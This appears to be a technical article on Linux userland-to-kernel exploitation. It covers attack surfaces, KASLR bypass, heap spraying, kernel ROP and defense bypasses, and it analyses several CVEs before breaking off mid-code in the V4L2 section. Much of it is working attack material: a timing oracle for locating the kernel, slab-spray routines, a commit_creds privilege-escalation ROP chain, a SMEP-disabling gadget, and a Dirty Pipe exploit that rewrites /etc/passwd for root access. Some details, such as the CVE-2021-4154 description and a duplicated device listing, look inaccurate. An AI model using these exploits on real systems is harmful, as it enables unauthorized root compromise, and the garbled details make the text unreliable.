# Ring 3 (Userland): Attack Surfaces, Exploitation, and Mitigations

> A technical deep-dive into userland-to-kernel attack methodology, real-world exploit analysis, and defensive countermeasures at the Ring 3 boundary.

---

## Table of Contents

1. [Ring 3 Attack Surface Overview](#1-ring-3-attack-surface-overview)
2. [Exploitation Methodology: Ring 3 → Ring 0](#2-exploitation-methodology-ring-3--ring-0)
3. [Real-World Exploit Analysis](#3-real-world-exploit-analysis)
4. [Mitigations at Ring 3 Level](#4-mitigations-at-ring-3-level)
5. [The Syscall Interface](#5-the-syscall-interface)

---

## 1. Ring 3 Attack Surface Overview

### 1.1 The Privilege Boundary

x86 protection rings establish a hardware-enforced privilege hierarchy. Ring 3 (user mode) operates with CPL=3, restricting access to privileged instructions (e.g., `cli`, `hlt`, `mov cr0`, `invlpg`, `wrmsr`), I/O ports (governed by the TSS I/O permission bitmap), and memory regions (enforced by page-table U/S bits). Ring 0 (kernel mode, CPL=0) has unrestricted access.

The **only legitimate transition** from Ring 3 to Ring 0 on modern x86-64 Linux occurs through:

| Mechanism       | Instruction          | Entry Point              | Use Case                          |
|-----------------|----------------------|--------------------------|-----------------------------------|
| `syscall`      | `syscall`            | `entry_SYSCALL_64`       | 64-bit system calls               |
| `int 0x80`     | `int 0x80`           | `entry_INT80_compat`     | 32-bit legacy system calls        |
| `sysenter`     | `sysenter`           | `entry_SYSENTER_compat`  | 32-bit fast system calls          |
| Interrupts      | Hardware interrupt   | IDT gate handlers        | Device interrupts, exceptions     |
| Exceptions      | CPU exceptions       | IDT gate handlers        | #PF, #GP, etc.                   |

Every crossing of this boundary is an attack opportunity.

### 1.2 Exposed Surfaces

From Ring 3, an attacker can interact with the kernel through multiple interfaces:

#### 1.2.1 Direct Kernel Interfaces

```
/proc/[pid]/...          — Process information, memory maps, sysctls
/sys/...                 — Kernel parameters, device models, kobjects
/dev/...                 — Character/block devices (ioctl, read, write, mmap)
netlink sockets          — Netfilter, routing, SELinux, audit subsystems
bpf() syscall            — eBPF program loading and map manipulation
perf_event_open()        — Performance counters, hardware tracing
userfaultfd              — User-controlled page fault handling
io_uring                 — Async I/O submission and completion
```

#### 1.2.2 Indirect Attack Surfaces

| Surface                    | Description                                                      |
|---------------------------|------------------------------------------------------------------|
| Shared memory (mmap)      | Pages shared between user and kernel; UAF via mapping tricks     |
| Signal handlers            | Kernel delivers signals; race conditions in signal delivery      |
| ptrace                     | Process debugging interface; TOCTOU with memory reads            |
| userfaultfd                | User-controlled fault handler; stalls kernel in page faults     |
| FUSE                       | Userspace filesystem; kernel holds locks during userspace ops    |
| v4l2 / media subsystem    | Complex ioctl structures; many drivers, large attack surface     |
| Network protocols          | Packet parsing in kernel; parsing of user-controlled data        |
| eBPF verifier              | Incorrect verifier proofs leading to arbitrary kernel access    |

#### 1.2.3 Attack Surface Taxonomy

```
                    ┌─────────────────────────────────┐
                    │       Ring 3 (Userland)          │
                    │                                   │
                    │  ┌───────────┐  ┌──────────────┐ │
                    │  │ syscalls  │  │  /dev/ioctl   │ │
                    │  └─────┬─────┘  └──────┬───────┘ │
                    │        │                │          │
                    └────────┼────────────────┼──────────┘
                             │                │
                    ═════════╪════════════════╪══════════
                    RING BOUNDARY (CPL 3→0)
                    ═════════╪════════════════╪══════════
                             │                │
                    ┌────────┼────────────────┼──────────┐
                    │        ▼                ▼          │
                    │  ┌───────────┐  ┌──────────────┐   │
                    │  │ syscall   │  │  VFS/ioctl   │   │
                    │  │ handler   │  │  handler      │   │
                    │  └─────┬─────┘  └──────┬───────┘   │
                    │        │                │          │
                    │        ▼                ▼          │
                    │  ┌──────────────────────────────┐  │
                    │  │      Ring 0 (Kernel)          │  │
                    │  │  Subsystems, Drivers, Core    │  │
                    │  └──────────────────────────────┘  │
                    └─────────────────────────────────────┘
```

---

## 2. Exploitation Methodology: Ring 3 → Ring 0

### 2.1 Information Gathering: Leaking Kernel Addresses and Bypassing KASLR

**Kernel Address Space Layout Randomization (KASLR)** randomizes the base address of the kernel text segment at boot. On x86-64 Linux, the kernel image is relocated by a random offset in the range `[0xffffffff80000000, 0xffffffffc0000000)` with 2 MB alignment, providing ~10 bits of entropy (1024 possible positions).

#### 2.1.1 KASLR Bypass Techniques

**Direct information leaks through /proc and /sys:**

Historically, `/proc/kallsyms` exposed all kernel symbol addresses to any user. Modern kernels restrict this (`kptr_restrict`=1), showing `0x0000...` for unprivileged users—but the restriction can be bypassed:

```c
// Bypass: if the process has CAP_SYSLOG, addresses are shown
// Also, /proc/kallsyms addresses leak through side channels:
// 1. Module loading reveals kernel text offsets
// 2. /sys/module/[name]/sections/.text leaks section addresses
// 3. dmesg may contain kernel pointers (dmesg_restrict=0)
```

**Side-channel attacks on KASLR:**

| Technique               | Description                                          | Precision  | Requirements        |
|------------------------|------------------------------------------------------|-------------|----------------------|
| Prefetch side-channel  | Timing difference between mapped/unmapped addresses | ~4 KB      | Shared core          |
| TLB side-channel       | TLB hit/miss timing reveals page table entries       | ~4 KB      | Shared TLB (HT)      |
| DRAM row collision     | Row buffer timing reveals physical address bits      | ~256 rows   | Unmanaged DRAM       |
| Branch prediction      | BTB/RSB state leaks kernel branch targets            | ~feasible  | Shared core          |
| TSX-based              | Transactional memory abort timing on #PF             | Byte-level | Intel TSX            |

**Prefetch side-channel example:**

```c
// Construct a timing oracle for kernel addresses
#include <x86intrin.h>

uint64_t speculate_address(uint64_t addr) {
    uint64_t t1, t2;
    t1 = __rdtsc();
    _mm_lfence();
    // Prefetch to kernel address — speculatively accesses TLB
    asm volatile("prefetchnta (%0)" :: "r"(addr));
    _mm_lfence();
    t2 = __rdtsc();
    return t2 - t1;
}

// Scan potential KASLR offsets; mapped pages will have
// lower latency due to TLB hits or speculative walk hits
void kaslr_bypass() {
    uint64_t base = 0xffffffff80000000ULL;
    for (int i = 0; i < 1024; i++) {
        uint64_t candidate = base + (i * 0x200000ULL);
        uint64_t latency = speculate_address(candidate);
        if (latency < THRESHOLD) {
            printf("Kernel likely at: 0x%lx (latency: %lu)\n",
                   candidate, latency);
        }
    }
}
```

**Information leaks via unprivileged /proc entries:**

```bash
# Even with kptr_restrict=1, various /sys and /proc entries leak addresses:
cat /sys/module/kernel/sections/.text        # Kernel text section address
cat /sys/module/kernel/sections/.data        # Kernel data section address
cat /proc/iomem                              # Physical memory map (if readable)
cat /proc/kallsyms                           # With CAP_SYSLOG or kptr_restrict=0
dmesg | grep "Kernel"                        # Kernel log may print addresses
```

**Kernel pointer leaks via `dmesg`:**

Many kernel printk statements use `%pK` which should hash pointers, but `kptr_restrict=0` (the default on many distros) exposes real addresses:

```
[    0.000000] Kernel command line: BOOT_IMAGE=/vmlinuz-5.15.0 ...
[    1.234567] some_driver: registered device at ffffffffa0103c40
```

#### 2.1.2 Heap Address Leaks

Kernel heap (slab/slub) addresses can leak through:

```c
// Common leak: use-after-free reads on freed slab objects
// A freed slab object's freelist pointer is stored inline:
struct slab_freelist_ptr {
    unsigned long next;       // Points to next free object
    unsigned long key;        // Obfuscation key (CONFIG_SLAB_FREELIST_HARDENED)
};

// Without freelist hardening, reading a freed object directly
// reveals the next free object's address (heap leak)
```

### 2.2 Kernel Attack Surface from Userspace

#### 2.2.1 ioctl — The Primary Attack Vector

The `ioctl` interface is the most prolific attack surface for kernel drivers. Each driver defines its own ioctl commands, argument structures, and semantics. Defects arise from:

```c
// Common ioctl vulnerability patterns:

// 1. Missing access_ok() / copy_from_user validation
volatile long my_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    void __user *user_ptr = (void __user *)arg;
    // VULNERABLE: Direct kernel-space dereference of user pointer
    // Should use copy_from_user()/copy_to_user()
    *(int *)user_ptr = 0;  // Kernel OOPS or arbitrary write
}

// 2. Integer overflow in size calculation
volatile long my_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    struct my_data __user *udata = (struct my_data __user *)arg;
    size_t count = udata->count;
    // VULNERABLE: count * sizeof(item) overflows, small allocation
    void *buf = kmalloc(count * sizeof(struct item), GFP_KERNEL);
    // ... then copies 'count' items into undersized buffer
}

// 3. Type confusion via ioctl command dispatching
volatile long my_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    switch(cmd) {
    case MY_CMD_SET:
        // VULNERABLE: No capability check — any user can set privileged state
        priv_data->important_ptr = (void *)arg;
        break;
    case MY_CMD_GET:
        // VULNERABLE: Copies kernel pointer to userspace (info leak)
        copy_to_user((void __user *)arg, &priv_data->important_ptr,
                     sizeof(priv_data->important_ptr));
        break;
    }
}
```

#### 2.2.2 sysfs and /proc Attack Surfaces

```bash
# sysfs stores kernel objects as files with loose permission models
# Attack surface: writing to sysfs attributes triggers kernel parsers

# Example: netfilter sysctl validation bypass
echo "1" > /proc/sys/net/ipv4/ip_forward   # Simple, validated
echo "malicious" > /sys/class/.../attribute # May trigger parser bugs

# /proc entries for each process expose:
/proc/[pid]/maps          # Memory mappings (ASLR defeat if readable)
/proc/[pid]/mem           # Direct memory R/W (requires ptrace access)
/proc/[pid]/status        # Contains signal masks, cap info
/proc/[pid]/syscall       # Current syscall + args (info leak)
```

#### 2.2.3 Netlink Attack Surface

Netlink sockets provide a bidirectional communication channel between user and kernel space:

```c
// Creating a netlink socket
int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);

// Attack surface: netlink message parsing in kernel
// Many subsystems register netlink handlers:
// - NETLINK_ROUTE:   routing, neighbors, addresses
// - NETLINK_AUDIT:   audit subsystem
// - NETLINK_SELINUX: SELinux event messages
// - NETLINK_NETFILTER: nf_tables, nf_conntrack

// Common bugs: NLA_TYPE/NLA_F_NESTED confusion,
//              OOB reads from incorrect nla_len,
//              use-after-free in request callback,
//              integer overflow in attribute parsing
```

#### 2.2.4 /dev Character/Block Device Entries

```bash
# Device nodes with world-readable/writable permissions are high-risk
crw-rw-rw- 1 root root 1, 3 /dev/null      # Safe: simple implementation
crw-rw-rw- 1 root root 10, 1 /dev/psaux    # Dangerous: complex driver
crw-rw---- 1 root video 226, 0 /dev/fb0    # GPU framebuffer: large attack surface
crw-rw---- 1 root video 29, 0 /dev/fb0     # v4l2 devices: enormous ioctl surface
```

### 2.3 Heap Spraying Techniques for Kernel Exploitation

#### 2.3.1 Why Heap Spray?

Kernel exploits frequently need to:
1. **Control the contents** of freed slab objects (UAF reclamation)
2. **Position objects** at known/predictable addresses
3. **Allocate objects** adjacent to target objects for cross-object corruption

The Linux kernel uses the SLUB allocator, which organizes memory into **caches** (per-object-type) and **slabs** (contiguous pages of same-sized objects).

#### 2.3.2 Cross-Cache Attack

Different slab caches serve different object sizes. When an exploit frees an object in one cache and needs to reclaim it with controlled data from another cache, a **cross-cache** attack is necessary:

```
Target object cache (kmalloc-64):
┌──────────────────────────────────────────────────┐
│ obj A (victim) │ free │ free │ free │ ... │ free │
└──────────────────────────────────────────────────┘
                         ↓ free(obj A)
┌──────────────────────────────────────────────────┐
│ free            │ free │ free │ free │ ... │ free │
└──────────────────────────────────────────────────┘
                         ↓ heap spray with controlled data
Spray cache (msg_msg, sk_buff, etc.):
┌──────────────────────────────────────────────────┐
│ spray obj 1     │ spray│spray │ ... │ free │ ... │
└──────────────────────────────────────────────────┘
```

#### 2.3.3 Common Spray Objects

| Object Type       | Cache            | Size (bytes)  | Control                    | Notes                           |
|-------------------|------------------|----------------|----------------------------|---------------------------------|
| `msg_msg`         | kmalloc-64+      | 64–4096+       | Header + body controllable | Classic; size tunable via mtext |
| `sk_buff` (data) | kmalloc-512+    | Variable       | Full payload control       | Flexible, commonly available    |
| `setxattr`        | kmalloc-*        | 1–65535        | Full payload control       | Simplest, no persistent object  |
| `add_key`         | kmalloc-*        | 1–65535        | Payload via description    | Requires KEYCTL_READ            |
| `pipe_buffer`     | kmalloc-cg-1024  | 1024           | ops pointer controllable   | Useful for function ptrs        |
| `tty_struct`      | kmalloc-cg-2048  | 2048           | Partial control            | Has function pointer table      |
| `seq_operations`  | kmalloc-32       | 32             | Trigger via read           | Small objects                   |
| `io_uring`        | kmalloc-cg-*     | Various        | Complex state machine      | Rich attack surface             |

#### 2.3.4 Heap Spray with `setxattr`

```c
// setxattr is ideal for heap spraying because:
// 1. Full control over payload content
// 2. Arbitrary size (1-65535 bytes) → targets any kmalloc-N
// 3. No persistent object remains (immediately freed after copy)
// 4. Works on all kernels with xattr support

#include <sys/xattr.h>

void spray_heap(uint64_t target_cache_size, void *data, size_t data_len) {
    char path[] = "/tmp/spray";
    char name[] = "user.spray";
    
    // Repeatedly set extended attributes to fill slab pages
    for (int i = 0; i < SPRAY_COUNT; i++) {
        // data_len must match target_cache_size for correct slab
        setxattr(path, name, data, data_len, 0);
        // setxattr allocates, copies data, then immediately frees
        // This helps reclaim freed slab objects
    }
}
```

#### 2.3.5 msg_msg Spray (Persistent Objects)

```c
// msg_msg stays allocated until msgrcv(), allowing stable reclamation

#include <sys/msg.h>

struct msgbuf_flex {
    long mtype;
    char mtext[MAX_TEXT];
};

void msg_spray(int qid, long mtype, void *data, size_t size) {
    struct msgbuf_flex *msg = malloc(sizeof(long) + size);
    msg->mtype = mtype;
    memcpy(msg->mtext, data, size);
    
    // msgsnd allocates from kmalloc-N where N fits the message
    // Includes 48-byte msg_msg header + message body
    msgsnd(qid, msg, size, 0);
}

// Free specific messages to create holes:
// msgrcv(qid, &buf, size, mtype, 0);
// This gives precise control over allocation/free timing
```

#### 2.3.6 SLAB_FREELIST_HARDENED

Modern kernels implement `CONFIG_SLAB_FREELIST_HARDENED`, which XORs freelist pointers with a random key:

```c
// In SLUB, free object pointers are encoded:
// stored_ptr = ptr ^ random_key ^ (&obj->next)  [pointer encryption]
// This prevents linear freelist pointer leaks from UAF reads

// Bypass: Leak both the encrypted pointer AND the key
// The key is stored per-slab or globally.
// Technique: Overlap two allocations; read the freelist ptr
// of one to derive the key, then decode pointers of others.
```

### 2.4 Stack Pivoting and ROP in Kernel Context

#### 2.4.1 The Kernel Stack

Each task has a kernel stack (16 KB by default, `THREAD_SIZE`), with the `task_struct` at the bottom:

```
High Address
┌─────────────────────┐
│   task_struct       │ ← thread_info (at stack bottom, or separate)
├─────────────────────┤
│   Kernel Stack      │ ← Grows downward
│                     │
│   [Frame N]         │
│   [Frame 1]         │
│   [Frame 0]         │ ← RSP points here during syscall
├─────────────────────┤ ← Stack limit (0x1000 bytes from task_struct)
│   Stack Guard Page  │ ← PAGE_SIZE guard (0x2000 if VMAP stacks)
└─────────────────────┘
Low Address
```

The kernel stack pointer (RSP) is loaded from `current_task->thread.sp` on context switch. Its value is:

```
RSP = task_struct_ptr + THREAD_SIZE - offset_into_stack
```

This predictability (RSP is a known offset from `current`) is exploitable.

#### 2.4.2 Stack Pivoting

When an attacker gains control of RSP (e.g., via a function pointer call that uses a controllable register), they can redirect the stack to a memory region they control:

```asm
; Typical stack pivot gadgets in the kernel:
; xchg rax, rsp     ; If RAX is controllable, swap to user-controlled memory
; mov rsp, rax       ; Direct RSP control if RAX is controllable
; push rax; pop rsp  ; Equivalent to mov rsp, rax after push/pop

; After pivoting, ROP chain execution begins from the new stack
```

**Pivot targets:**

| Target               | Addressability            | Pros                       | Cons                          |
|----------------------|---------------------------|----------------------------|-------------------------------|
| User-mapped page     | Known (if no SMAP)        | Full control               | Blocked by SMAP              |
| msg_msg body         | Predictable (heap spray)  | Persists in kernel         | Size-limited, fragmented      |
| setxattr payload     | Known-via-adjacent        | Full payload               | Transient (freed quickly)      |
| pipe_buffer          | Known (single alloc)      | Contains function ptrs     | Limited availability          |
| MMAP'd region        | Known-via-addr            | Large, aligned             | May not be at expected addr   |

#### 2.4.3 ROP Chain Construction

A kernel ROP chain executes arbitrary kernel functionality using gadgets found in the kernel text:

```c
// Example: ROP chain to escalate privileges (Linux 5.x)
// Goal: commit_creds(prepare_kernel_cred(0))

uint64_t rop_chain[] = {
    // prepare_kernel_cred(0)
    POP_RDI_RET,                  // pop rdi; ret
    0x0,                          // rdi = 0 (init_cred)
    PREPARE_KERNEL_CRED_ADDR,     // prepare_kernel_cred

    // commit_creds(result)
    POP_RCX_RET,                  // pop rcx; ret (to align stack if needed)
    0xDEADBEEF,                   // dummy value for rcx
    COMMIT_CREDS_ADDR,            // commit_creds (rax = new cred from p_k_c)
    
    // Return to userspace safely
    SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE,
    0, 0,                         // rdi, rsi (dummy for restore regs)
    USER_RIP,                      // return address in userspace
    USER_CS,                       // CS selector (0x33 for 64-bit)
    USER_RFLAGS,                   // RFLAGS
    USER_RSP,                      // RSP (userspace stack)
    USER_SS,                       // SS selector (0x2b)
};
```

#### 2.4.4 Gadget Extraction

```bash
# Finding ROP gadgets in vmlinux
ROPgadget --binary ./vmlinux | grep ": pop rdi ; ret$"
ROPgadget --binary ./vmlinux | grep ": mov cr4"
ROPgadget --binary ./vmlinux | grep ": xchg .* rsp"

# Key gadgets needed:
# 1. pop rdi; ret          — Set first argument
# 2. pop rsi; ret          — Set second argument  
# 3. mov rdi, rax; ...     — Chain return values
# 4. xchg eax, esp; ret    — Stack pivot
# 5. swapgs; iretq         — Return to userspace (pre-5.14)
# 6. swapgs_restore_regs_and_return_to_usermode — Return to userspace (5.14+)
```

#### 2.4.5 KPTI Return Path

With Kernel Page-Table Isolation (KPTI), returning to userspace is more complex:

```asm
; The kernel cannot simply "iretq" back — it must switch page tables
; from the kernel PGD to the user PGD first.
;
; On 5.x+ kernels, the safe return path is:
;   swapgs_restore_regs_and_return_to_usermode
;
; Which does (simplified):
;   SWAPGS                          ; Restore GS for userspace
;   MOV RDI, RSP                    ; Save kernel stack pointer
;   PUSH RDI                        ; Save old stack
;   ... (restore registers from stack) ...
;   IRETQ                           ; Return to userspace
;
; The ROP chain must provide:
;   [swapgs_restore path addr]
;   0                               ; padding  
;   0                               ; padding
;   [user RIP]
;   [user CS]
;   [user RFLAGS]
;   [user RSP]
;   [user SS]
```

### 2.5 Bypassing Modern Kernel Defenses

#### 2.5.1 Defense Matrix

| Defense            | Introduced       | Protects Against                     | Bypass Difficulty |
|--------------------|------------------|--------------------------------------|-------------------|
| KASLR              | 3.14 (2014)      | Kernel address disclosure            | Low–Medium        |
| SMEP               | 3.0 (2011)       | Executing userspace code in R0      | Medium            |
| SMAP               | 3.7 (2012)       | Accessing userspace data from R0    | Medium–Hard       |
| KPTI               | 4.15 (2018)      | Meltdown-type side channels          | Hard (by design)  |
| Stack canaries     | 4.x intensified  | Stack buffer overflows               | Medium            |
| CFI (Clang)        | 5.18 (2022)      | Control-flow hijacking               | Hard              |
| KASAN              | 4.0 (2014)       | UAF/OOB detection (debug)           | Low (offset-based)|
| kFREE_HARDENED     | 4.x              | Freelist pointer corruption          | Medium            |
| RAP/PA            | PaX/Grsecurity   | Arbitrary function pointer calls     | Hard              |
| RSB/RSB_FILL       | 4.12+            | RSB-based Spectre variants           | Hard              |
| HARDENED_USERCOPY | 4.x              | copy_*_user bounds checking          | N/A (prevention)  |
| INIT_ON_ALLOC      | 5.x              | Use of uninitialized heap memory     | N/A (prevention)  |

#### 2.5.2 SMEP (Supervisor Mode Execution Prevention)

SMEP sets the 20th bit of CR4 (`CR4.SMEP`). When set, any attempt to execute code at a userspace page while in Ring 0 triggers a #GP fault.

**Bypass techniques:**

1. **ROP only (no shellcode):** Build a ROP chain entirely from kernel-text gadgets. This is the standard approach.

2. **CR4 manipulation gadget:**
```asm
; Gadget to disable SMEP:
mov rax, cr4
and rax, ~(1 << 20)     ; Clear SMEP bit
mov cr4, rax
; Then jump to userspace shellcode
```
*Note: `CR4.WP` (bit 16) is also often cleared to allow kernel writes to read-only pages.*

3. **KVM virtualization bypass:** In VMs where the attacker controls guest kernel, `kvm` may not fully enforce SMEP in all guest contexts.

#### 2.5.3 SMAP (Supervisor Mode Access Prevention)

SMAP sets the 21st bit of CR4. When set, Ring 0 cannot read/write userspace pages (including ROP stack in userspace). The `AC` flag in RFLAGS temporarily suspends SMAP via `stac`/`clac`.

**Bypass techniques:**

1. **Kernel heap as ROP stack:** Pivot to a kernel-heap object (msg_msg, pipe_buffer, etc.) whose contents the attacker controls. This is the primary technique.

2. **Leak then pivot:**
```c
// Step 1: Leak kernel heap address via info leak
// Step 2: Spray controlled data to that address
// Step 3: Pivot RSP to the sprayed kernel address
```

3. **Character device data bypass:** Some kernel paths (e.g., `copy_from_user` with `stac`) temporarily disable SMAP. Race conditions in these windows can be exploited.

4. **`stac; ... ; clac` gadget chain:** If a gadget sequence exists that executes `stac` before accessing user memory:
```asm
stac                ; Clear AC flag → SMAP bypassed
mov rax, [rdi]      ; Read from user pointer in RDI
clac                ; Restore AC flag
ret
```

5. **PTE manipulation:** Overwrite a userspace PTE to set the `_PAGE_KERNEL` bit, making the page accessible from Ring 0. Requires a write primitive.

#### 2.5.4 KASLR Bypass (Summary of Techniques)

```python
# KASLR leak strategies ranked by reliability:

# 1. /proc/kallsyms (if kptr_restrict=0 or CAP_SYSLOG)
#    → Zero cost, exact addresses

# 2. /sys/module/.../sections/.text  (world-readable by default)
#    → Reveals module load addresses

# 3. Hardware side channels (prefetch, TSX)
#    → Requires shared core, ~10ms to locate kernel

# 4. Uninitialized kernel data -> copy_to_user
#    → Depends on specific vulnerability

# 5. Heap object reclamation leak
#    → UAF read reveals kernel heap pointers

# 6. Struct padding / uninitialized fields
#    → Kernel structs may have padding bytes with stale pointers
```

#### 2.5.5 KPTI (Kernel Page-Table Isolation)

KPTI maintains two page tables per process:
1. **Kernel PGD:** Maps both kernel and user space
2. **User PGD:** Maps only user space (with minimal kernel trampolines)

```c
// KPTI page table layout (simplified):
// User PGD entries:
//   0x0000000000000000 - 0x0000800000000000 → User-space mappings
//   0xffff800000000000 - 0xffffffff80000000 → NOT MAPPED (except entry/exit)
//   0xffffffff80000000 - 0xffffffffa0000000 → Minimal trampoline pages
//   0xffffffffa0000000 - 0xffffffffc0000000 → NOT MAPPED

// This means: Meltdown-type attacks that read kernel memory
// from userspace via transient execution are blocked because
// the kernel pages simply aren't in the user page tables.
```

**KPTI bypass is generally not needed** if the exploit already has a kernel read/write primitive. KPTI is a defense against Meltdown (reading kernel memory from userspace), not against exploits that already run kernel code.

#### 2.5.6 Control Flow Integrity (Clang CFI)

Clang-based kernel CFI (CONFIG_CFI_CLANG) enforces that indirect function calls must target a valid function with the correct signature:

```c
// Before CFI, this is a valid exploit:
//   func_ptr = (void *)arbitrary_address;
//   func_ptr(arg1, arg2);

// With CFI, before the indirect call, the compiler inserts:
//   if (!cfi_type_match(func_ptr, expected_type))
//       __cfi_check_fail(func_ptr, expected_type);
//   func_ptr(arg1, arg2);

// CFI check format:
//   Jump to func_ptr
//   Before: func_ptr[-1] must contain a type hash that matches
//           the expected type at the call site
```

**CFI bypass techniques:**

1. **Type-confusion Intra-type:** Call a function that has the correct CFI type signature but performs an unintended action. For example, call a struct's `.release` method that does `kfree` when you want general kernel code execution.

2. **Gadget-within-valid-function:** Use ROP gadgets within approved CFI target functions. CFI only checks indirect calls, not return addresses on the stack.

3. **Overwrite CFI metadata:** If you have a write primitive, overwrite the type hash stored before the function pointer.

4. **Use `bpf_jump` or similar:** eBPF JIT compilation produces valid function pointers with correct CFI types.

```c
// CFI bypass via struct_ops:
// Many kernel structs contain function pointer tables (ops structs)
// If the exploit can replace an ops pointer with another valid
// function of the same type, CFI won't catch it.

// Example: replacing tty->ops->write with p->ops->ioctl
// Both take (struct tty_struct *, const unsigned char *, int)
// but have different side effects
```

---

## 3. Real-World Exploit Analysis

### 3.1 CVE-2022-0847 — "Dirty Pipe"

**Vulnerability:**
A missing `flags` initialization in `pipe_buffer` when a new pipe is created or when data is appended via `copy_page_to_iter_pipe`.

**Affected Versions:** Linux 5.8 – 5.16.11 (fixed in 5.16.12, 5.15.25, 5.10.102)

**Root Cause:**

In `copy_page_to_iter_pipe()`, when splicing data from a file into a pipe, the code sets the `PIPE_BUF_FLAG_CAN_MERGE` flag on the pipe buffer:

```c
// Vulnerable code in lib/iov_iter.c (Linux 5.16):
static size_t copy_page_to_iter_pipe(struct page *page, size_t offset,
                                      size_t bytes, struct iov_iter *i)
{
    struct pipe_inode_info *pipe = i->pipe;
    struct pipe_buffer *buf = &pipe->bufs[i->head & (pipe->ring_size - 1)];
    
    // BUG: buf->flags are NOT cleared here!
    // A previous PIPE_BUF_FLAG_CAN_MERGE flag may persist
    // from a previous pipe operation
    
    buf->ops = &page_cache_pipe_buf_ops;
    buf->flags = PIPE_BUF_FLAG_CAN_MERGE;  // Always set, never cleared
    // ...
}
```

The `PIPE_BUF_FLAG_CAN_MERGE` flag tells the kernel that further `write()` calls to this pipe can merge data into the existing page cache page. Combined with `splice()`, this allows **overwriting any file the attacker can read** — including read-only files like `/etc/passwd` or SUID binaries.

**Exploitation Steps:**

```c
// 1. Create a pipe
int pipefd[2];
pipe(pipefd);

// 2. Fill the pipe to set PIPE_BUF_FLAG_CAN_MERGE on all buffers
for (int i = 0; i < PIPE_DEF_BUFS; i++) {
    write(pipefd[1], buf, PIPE_BUF_SIZE);  // page-sized writes
}

// 3. Drain the pipe (read all data out)
//    This empties the pipe but the flag is NOT cleared!
for (int i = 0; i < PIPE_DEF_BUFS; i++) {
    read(pipefd[0], buf, PIPE_BUF_SIZE);
}

// 4. Splice the target file into the pipe
int fd = open("/etc/passwd", O_RDONLY);
splice(fd, &offset, pipefd[1], NULL, 1, 0);

// 5. Write arbitrary data — it merges into the page cache!
write(pipefd[1], "root::0:0:root:/root:/bin/sh\n", 30);
// Now /etc/passwd contains our modified content
```

**Impact:** Any user can overwrite read-only files, setuid binaries, and `/etc/crontab`. Root access achieved by overwriting `/etc/passwd` or modifying a SUID binary.

**Fix:** Clear `buf->flags` when a new `pipe_buffer` is initialized in `copy_page_to_iter_pipe`:
```c
buf->flags = 0;  // Don't inherit old flags
```

**Significance:** Dirty Pipe is the spiritual successor to Dirty COW (CVE-2016-5195). It demonstrates that the kernel's page cache + splice infrastructure remains a high-value attack surface, and that missing initialization remains a common bug pattern.

---

### 3.2 CVE-2021-4154 — cgroupv2 eBPF Out-of-Bounds Write

**Vulnerability:** An out-of-bounds write in the BPF verifier due to incorrect bounds tracking of `rego` (register offset) during pointer arithmetic.

**Affected Versions:** Linux 5.7 – 5.15.x (pre-5.15.7)

**Root Cause:**

The eBPF verifier tracks the range of possible values for each register. When a register holds a pointer and an offset is added, the verifier must ensure the resulting access is within bounds. The bug was in how `__reg_combine_32_into_64()` combined bounds for 32-bit operations:

```c
// In kernel/bpf/verifier.c:
// The verifier tracked bounds separately for 32-bit and 64-bit values.
// When combining 32-bit bounds into 64-bit bounds, it failed to
// properly propagate signedness information, leading to:
//
//   tnum_range(u32_min_value, u32_max_value) producing a WIDER
//   64-bit range than actually possible
//
// This meant the verifier believed a pointer access was in-bounds
// when it was actually out-of-bounds.

static void __reg_combine_32_into_64(struct bpf_reg_state *reg)
{
    // BUG: The 64-bit bounds were not properly tightened
    // after 32-bit operations. Specifically:
    // reg->smax_value was not clamped to the 32-bit range
    // which allowed OOB access
}
```

**Exploitation Flow:**

```
1. Craft eBPF program with 32-bit arithmetic that
   causes verifier to underestimate value ranges

2. Obtain a pointer to a map value (BPF_MAP_VALUE)

3. Use the miscalculated range to perform an OOB read/write
   past the bounds of the map value

4. Read/write arbitrary kernel memory via the OOB access

5. Overwrite modprobe_path or core_pattern for root
```

**Example BPF program skeleton:**

```c
// Simplified exploit BPF program:
SEC("socket")
int exploit(struct __sk_buff *skb) {
    // Map with small value size
    struct bpf_map_def MAP = {
        .type = BPF_MAP_TYPE_ARRAY,
        .key_size = sizeof(int),
        .value_size = 8,       // Small allocation
        .max_entries = 1,
    };
    
    int key = 0;
    u64 *val = bpf_map_lookup_elem(&MAP, &key);
    if (!val) return 0;
    
    // 32-bit arithmetic that fools the verifier
    u64 idx = ...; // Crafted value that verifier thinks is in [0,7]
                   // but actually can be much larger
    
    // The verifier allows this because it thinks idx is in bounds
    // But it's actually OOB
    val[idx] = target_value; // OOB write!
    
    return 0;
}
```

**Fix:** Properly propagate bounds when combining 32-bit into 64-bit in the verifier, ensuring `smax_value` is clamped correctly.

**Significance:** This is emblematic of a whole class of eBPF verifier bugs. The BPF verifier is a complex program-analyzer written in C; proof-of-correctness bugs are inevitable. The eBPF subsystem remains one of the most critical attack surfaces precisely because it's a user-accessible path to Ring 0 with a verifier that must be bug-free.

---

### 3.3 CVE-2019-18683 — V4L2 Buffer Use-After-Free

**Vulnerability:** A use-after-free in the `v4l2_m2m` (memory-to-memory) subsystem caused by a race condition between buffer deletion and the device release callback.

**Affected Versions:** Linux 3.18 – 5.4 (fixed in 5.4-rc8)

**Root Cause:**

In `drivers/media/v4l2-core/v4l2-mem2mem.c`, the `v4l2_m2m_ctx_init()` function and subsequent buffer operations had a race window:

```c
// Simplified vulnerable flow:

// Thread 1: VIDIOC_REQBUFS / VIDIOC_QBUF (enqueue buffer)
v4l2_m2m_job_ready(ctx) {
    // Takes job from ctx->queue
    // Schedules device_run callback
    // The buffer is referenced by the job
}

// Thread 2: VIDIOC_STREAMOFF (dequeue/release buffer)
v4l2_m2m_streamoff(ctx) {
    // Frees the buffer that Thread 1's job still references
    // Does NOT cancel or synchronize with the pending job
    // → Use-after-free when device_run callback executes
}
```

The specific UAF occurs because `v4l2_m2m_buf_queue()` adds a buffer to the internal queue, but `v4l2_m2m_streamoff()` frees all queued buffers without ensuring the pending job has completed. The `device_run` callback then accesses freed memory.

**Exploitation:**

```c
// 1. Open a v4l2-m2m device
int dev_fd = open("/dev/video0", O_RDWR);
int cap_fd = open("/dev/video0", O_RDWR);

// 2. Set up the M2M context
struct v4l2_requestbuffers req = {
    .count = 1,
    .type = V4L2_BUF_TYPE_VIDEO_OUTPUT,
    .memory = V4L2_MEMORY_MMAP,
};
